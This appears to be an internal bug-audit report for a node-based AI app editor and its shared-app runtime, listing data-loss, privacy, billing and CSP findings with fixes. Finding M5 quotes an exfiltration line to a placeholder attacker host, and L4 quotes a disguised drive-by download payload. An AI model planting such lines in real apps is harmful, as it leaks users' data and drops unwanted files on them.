# nanoodle Bug Audit — 2026-06-30

Exhaustive bug sweep of `index.html` (editor) and `play.html` (app builder + standalone runtime),
plus `_headers` (CSP) and the service worker. Run as an 8-dimension multi-agent audit
(node-runtime, API-integration, editor-canvas, share/export/persistence, play.html-runtime,
auth/OAuth, describe-copilot, security/privacy). Every finding was adversarially re-verified by a
separate pass whose job was to *refute* it; false positives were dropped. The two HIGH findings and
the CSP finding were then hand-checked against the source by a human-in-the-loop pass.

**Method:** static code-tracing for all findings, plus **live nano-gpt API calls** (key from `.env`,
cheap models) to confirm the TTS cost-meter contract. Live execution is noted per-finding.

## HIGH

### H1 — Version switch silently destroys manually-uploaded media (photo / audio / video / inpaint mask)
- **Category:** Share/Export/Persistence (data loss) · **Confirmed:** static
- **File:** `index.html:4412` (strip `4170–4178`, `MEDIA_KEYS` `4133`)
- **Failure:** After a Describe-changes edit creates v1, the user drags a photo into an
  Image/upload/inpaint node (writes `n.fields.image`/`mask`/`audio`/`video`; this calls `save()`
  only — no version push). They click another version to peek. `selectVersion`'s dirty-check
  (`4412`) compares `toSimple(serializeGraph())` vs `toSimple(cur.graph)`, but `strip()` drops every
  `MEDIA_KEYS` field **and** any `data:` string — so a media-only edit makes the two stripped graphs
  byte-identical. The guard is false, no "your canvas edits" snapshot is parked, and
  `applyGraphData(clone(v.graph)); save()` (`4416`) overwrites the live graph and the prior autosave.
  The uploaded media is permanently lost while the status reads "Back to the starting workflow." No
  undo stack exists. This is the same data-loss class as the historical "v4 loses my changes"
  reports, now for media edits — directly contradicting the code's own comment (`4406–4409`) that
  "jumping away always keeps your work."
- **Fix:** Make the dirty-check media-aware — compare full `serializeGraph()` JSON (or a normalizer
  that ignores only x/y/pan/zoom, **not** media) so any media-only edit forces a snapshot before
  `applyGraphData` overwrites.

### H2 — App-builder `shareableGraph` omits inpaint, leaking the user's source photo + brushed mask into every Share link & exported HTML
- **Category:** Security/Privacy (data leak) · **Confirmed:** static
- **File:** `play.html:3688–3692` (editor's correct version: `index.html:3580–3582`)
- **Failure:** "✨ Create app" hands play.html the **full** `serializeGraph()` (inpaint
  `fields.image`/`fields.mask` data: URLs included) via `#g=`/`#ga=` (`index.html:3791`), and
  `installApp` stores it verbatim in `APP_STATE.graph` (`play.html:3446`). play.html's
  `shareableGraph` only blanks `UPLOAD_FIELD = {upload, aupload, vupload}` — **no inpaint case** — so
  `doShare` (→ public `#a=` URL) and the export path (→ `window.NOODLE_GRAPH` in the standalone
  `.html`, `play.html:2884`) embed the user's private photo and mask verbatim. The editor's own
  `shareableGraph` explicitly blanks these (`if(n.type==="inpaint") … image:"", mask:""` //
  "don't leak the user's photo/mask"), proving intent; the builder copy diverged. A comment at
  `play.html:1826–1828` even *assumes* inpaint is blanked.
- **Note:** Plain `upload`/`aupload`/`vupload` nodes *are* blanked, making the leak silent and
  inconsistent. The editor's `#g=` handoff path is **not** affected (`index.html:3580` strips it);
  the bug is confined to play.html's share/export exits.
- **Fix:** Add `if(n.type==="inpaint") return {...n, fields:{...(n.fields||{}), image:"", mask:""}};`
  before the `UPLOAD_FIELD` map. Add an inpaint case to `check-export.mjs`'s round-trip graph so the
  regression is guarded.

## MEDIUM

### M1 — Failed node retains stale output → downstream node runs and charges on outdated input
- **Category:** Runtime/Execution (partial-failure propagation) · **Confirmed:** static
- **File:** `index.html:2922` (catch `2922–2925`; `n.out` write `2915`; edit guard `1520`; paid call `1527`)
- **Failure:** Image node A → Edit node B. Run 1 succeeds (`A.out.image = IMG1`). User changes A's
  prompt and re-runs; A's API call fails transiently (500/network). The catch marks A "error" but
  never clears `A.out` and doesn't re-throw, so A's done-promise **resolves**. B awaits it, reads
  stale `A.out.image = IMG1`, passes its `if(!imgs.length) throw` guard (non-null), and reaches the
  paid `ctx.genImage` call. Result: real money spent on stale input; a "done" child under an errored
  parent. (Default edit-node seed is blank, so the seed-skip cache doesn't save it.)
- **Fix:** On failure, clear/invalidate the node's output (`n.out = null` / `delete n._sig`) so
  dependents error or skip; or poison dependents as "skipped" instead of letting them consume the
  prior output.

### M2 — Exported/standalone app's cost meter never counts TTS Speech generations  *(LIVE-CONFIRMED)*
- **Category:** play.html-Runtime (incorrect cost accounting) · **Confirmed:** live
- **File:** `play.html:723` (`costFromHeaders` `502–506`; `bumpCost` `510–516`)
- **Failure:** A Speech (TTS) node's binary audio response skips the JSON cost branch and calls
  `onCost(costFromHeaders(r))`. A live probe of `POST /api/v1/audio/speech` (tts-1 → audio/mp3)
  confirms the response carries **no cost headers** and `access-control-expose-headers:
  WWW-Authenticate` only, so `costFromHeaders` returns `{usd:null}`, `bumpCost` adds nothing and
  flips `COST.exact=false`. The "spent on this app" meter undercounts every TTS run by its full cost
  (the `~` inexact marker partially signals this, but the number shown is still wrong).
- **Fix:** Don't rely on the non-exposed binary-audio headers; reconcile via a balance delta or a
  JSON cost field, and don't mark the session inexact for an expectedly-absent value.

### M3 — Node drag/resize/wire use unfiltered window pointer listeners → a second touch corrupts the gesture
- **Category:** Editor-UX (multitouch / race condition) · **Confirmed:** static
- **File:** `index.html:2443` (`startNodeDrag`; also `startNodeResize` `2462–2473`, `startWire` `2496–2528`)
- **Failure:** On a touchscreen, finger1 drags a node — the window `pointermove` handler reads **any**
  pointer's `clientX` (no `pointerId` guard, no `setPointerCapture`). Finger2 touches empty canvas →
  editor's `pointerdown` runs `select(null)` and seeds `gest='pan'`. Moving finger2 then drives
  **both** the pan and the node-drag: the node teleports to follow finger2 while the canvas pans, and
  `save()` persists the bogus position. The same pattern means an unrelated second-finger lift
  prematurely ends an in-progress resize/wire with the wrong pointer's coordinates.
- **Fix:** Capture `e.pointerId` in all three handlers and early-return in move/up when
  `ev.pointerId !== that id`; ignore editor-bg `pointerdown`s while a node gesture is active.

### M4 — `fromSimple` merges `old.fields` under the AI's fields → intentional field deletions silently reverted while the recap claims success
- **Category:** Describe-Copilot (logic error) · **Confirmed:** static
- **File:** `index.html:4193` (diff `4274–4293`; `summarize` `4489`)
- **Failure:** User asks "let the app pick the model" / "remove the system prompt." gptdiff correctly
  omits the key, so `diff(prevSimple, next)` flags it removed and `summarize()` prints "✓ updated 1
  setting." But the applied graph comes from `fromSimple`, whose merge `{...old.fields, ...sn.fields}`
  re-adds the missing key from `old.fields`. The override/prompt is **not** cleared — the edit
  silently no-ops while the UI claims success.
- **Fix:** Treat keys present in `old.fields` but absent in `sn.fields` as intentional deletions
  (protect only true media keys), or compute the recap against the actually-applied merged graph.

### M5 — `/play` CSP `media-src 'https:'` is an open exfiltration channel for the viewer's inputs/outputs
- **Category:** Security/Privacy (CSP / data exfiltration) · **Confirmed:** static
- **File:** `_headers:63` (and `:65` `/play.html`)
- **Failure:** A victim opens an attacker's `#a=` shared app, whose JS runs in the null-origin srcdoc
  iframe (`sandbox=allow-scripts`, inherits the page CSP). On `/play` the CSP **does** lock
  `connect-src` and `img-src` to nano-gpt.com (verified: `connect-src 'self' blob:
  https://nano-gpt.com` — no bare `https:`, unlike the editor's `/` route which intentionally allows
  it), but `media-src 'self' data: blob: https:` is a wildcard. The app reads the viewer's typed
  inputs and generated results (via the `__api_result__` bridge) and exfiltrates with e.g.
  `new Audio('https://attacker/?d='+secret)` — the only remaining wildcard-https channel, defeating
  the documented anti-exfiltration gate (`_headers:57–61`). The API key stays in the parent, so only
  app-visible data leaks.
- **Mitigation tension:** `media-src https:` exists for a real reason (`_headers:22–24`): generated
  music/video return as URLs on provider CDNs (e.g. `*.cloudfront.net`) that can't be enumerated, so
  naively dropping `https:` breaks `<audio>`/`<video>` playback. The fix must preserve playback.
- **Fix:** Tighten `media-src` to a provider-CDN allowlist, or proxy CDN media through the parent as
  `blob:` (the `__download__` bridge already proxies CDN bytes), instead of bare `https:`.

## LOW

### L1 — Run during the post-Stop drain window adopts the already-aborted controller → new run instantly stops
- **Category:** Runtime/Execution (abort handling) · **Confirmed:** static
- **File:** `index.html:2861` (`wasIdle` `2859`; `updateRunButtons` `2822`)
- **Failure:** User stops a long video job; the node stays in `runningNodes` up to ~5s (the 5000ms
  poll sleep is checked only *after* the non-abortable sleep). Per-node ▶ buttons on idle components
  stay enabled during drain. Clicking ▶ there computes `wasIdle = !runningNodes.size = false`, so no
  fresh `AbortController` is made and `ctl = runAbort` (aborted). Every fetch rejects with
  `AbortError` → nodes shown "stopped." The brand-new run silently does nothing. Self-heals once
  drain finishes (~5s).
- **Fix:** If `runAbort` exists but is aborted (draining), allocate a fresh controller for the new
  group; or disable **all** per-node run buttons while draining.

### L2 — Exported video runtime lacks `PENDING_VIDEO` resume → re-run after the 10-min timeout double-charges
- **Category:** play.html-Runtime (cost accounting / runtime divergence) · **Confirmed:** static
- **File:** `play.html:701` (`genVideo` `662–701`)
- **Failure:** A render exceeding the 600000ms poll window throws "Still rendering after 10 min … Try
  running it again." The play runtime has **no** `PENDING_VIDEO` map, so re-run POSTs a fresh
  `/api/generate-video` job and `onCost` bills again — duplicate charge + duplicate render. The
  editor avoids this (`index.html:3142` stores the runId, resumes, and says "you won't be charged
  twice").
- **Fix:** Port the editor's `PENDING_VIDEO` keyed-resume into `RUNTIME_JS genVideo`, or at minimum
  drop the "run it again" wording from the exported timeout message.

### L3 — AI-returned link with a missing port passes validation → dead wire bound to `port:undefined`
- **Category:** Describe-Copilot (broken error handling) · **Confirmed:** static
- **File:** `index.html:4204` (`validate` `4260–4264`; `applyGraphData` filter `3598`)
- **Failure:** Planner emits `{"from":"n1","to":"n2"}` (no `.port`). `fromSimple` splits to `['n1']`
  → `{from:{node:'n1',port:undefined}}`. `validate()` checks only node-id existence, so it passes;
  the link is kept and serialized into the saved graph/version/exports. At redraw the
  `[data-port="undefined"]` selector matches nothing (wire silently skipped) and at run-time
  `out[undefined]` is undefined → the downstream generator gets no input. Meanwhile `submit()`
  reports "✓ wired N connections."
- **Fix:** In `validate()`, require both a node and a non-empty port on each link endpoint and reject
  otherwise with a friendly message.

### L4 — `__download__` bridge allows a gesture-free drive-by download of an arbitrary https file  *(PLAUSIBLE)*
- **Category:** Security/Privacy (untrusted-input drive-by download) · **Confirmed:** static (impact weak)
- **File:** `play.html:3013–3025`
- **Failure:** A malicious shared app posts `{type:'__download__', url:'https://attacker/payload',
  name:'invoice.pdf'}` on load. The parent validates only `/^https:\/\//`, fetches, and
  programmatically `a.click()`s a blob download with the attacker-chosen (extension-preserving) name
  — no user gesture or origin allowlist.
- **Why PLAUSIBLE not CONFIRMED:** the iframe is already mounted with `sandbox` `allow-downloads`, so
  the app can self-download permissive-CORS URLs without the bridge; the bridge's unique add is only
  fetching CORS-restricted CDN bytes, and a saved non-executing file still requires the victim to
  open it. Real missing-gesture gap, marginal escalation.
- **Fix:** Require a real user activation (forwarded `isTrusted` click) before honoring
  `__download__`, and/or restrict the fetched origin to known provider CDNs.

### L5 — `__api__` proxy lets an untrusted shared app silently spend the signed-in viewer's credits  *(PLAUSIBLE)*
- **Category:** Security/Privacy (economic abuse / missing authZ gate) · **Confirmed:** static (borders on intended design)
- **File:** `play.html:3047` (`ALLOW_PATHS` `3039`)
- **Failure:** A signed-in viewer opens a malicious app. On load (no Run press) its JS loops
  `{type:'__api__', url:'/v1/images/generations'}`. The parent attaches the viewer's key and forwards
  each call (path is on `ALLOW_PATHS`) with no gesture check, rate limit, or spend cap — draining the
  viewer's balance with background paid generations.
- **Why PLAUSIBLE not CONFIRMED:** the share feature is *meant* to spend the viewer's key on
  generation, so this is a missing hardening control (gesture/cap) rather than a discrete defect.
- **Fix:** Gate paid generation behind a real user activation and/or a per-session spend
  confirmation/cap.

## Suggested fix order (by user impact)

1. **H2** (privacy leak in share/export) — breaks the core "noodle in privacy" promise; one-line fix.
2. **H1** (silent media data-loss on version switch) — destroys user work in an ordinary flow.
3. **M1 / L2** (charging on stale input / double-charge) — real money, erodes trust.
4. **M5** (media-src exfil) — privacy promise; needs a playback-preserving fix.
5. **M4 / L3** (describe-copilot correctness) — feature silently lies about what it did.
6. **M3 / L1** (editor gesture/abort glitches) — annoying, self-healing or local.
7. **M2** (TTS cost display) — cosmetic accounting.
8. **L4 / L5** (bridge hardening) — defense-in-depth on an intentional surface.
